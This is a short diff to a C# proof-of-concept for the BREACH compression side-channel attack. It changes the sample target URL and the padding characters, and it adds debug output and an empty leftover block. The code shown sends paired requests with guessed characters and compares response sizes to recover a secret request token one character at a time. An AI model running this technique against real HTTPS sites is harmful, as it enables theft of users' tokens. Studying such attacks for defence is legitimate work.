@@ -14,7 +14,7 @@ namespace BREACHBasic
         };
 
         // Sample, non-authenticated HTTPS-enabled endpoint vulnerable to BREACH
-        static string TargetURL = "https://malbot.net/poc/?param1=value1";
+        static string TargetURL = "https://malbot.net/poc/?param1=";
         static string canary = "request_token='";
 
         // Internal parameters
@@ -56,7 +56,10 @@ namespace BREACHBasic
                 {
                     if (ForceRecoveryMode)
                         break;
-
+                    if (c.ToString() == "b")
+                    {
+                        var test = "";
+                    }
                     // Provided only one guess has better compression that its peers, we accept it
                     if (IsCorrectGuess(canary + knownToken, c.ToString(), ref knownBad))
                     {
@@ -157,13 +160,15 @@ namespace BREACHBasic
             knownBad = false;
             String padding = String.Empty;
             for (int i = 0; i <= (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) / 2; i++)
-                padding += "{}";
+                padding += "-";
 
             HttpGet(TargetURL + currentCanary + guess + padding + "@");
             int? bytes1 = ReadBytes();
 
             HttpGet(TargetURL + currentCanary + padding + guess + "@");
             int? bytes2 = ReadBytes();
+
+            Console.WriteLine("Byte Check: byte1: " + bytes1 + " byte2: " + bytes2);
 
             // If something went wrong with this read, retry one time
             if (bytes1 == null || bytes2 == null || Math.Abs(bytes1.Value - bytes2.Value) > 100)
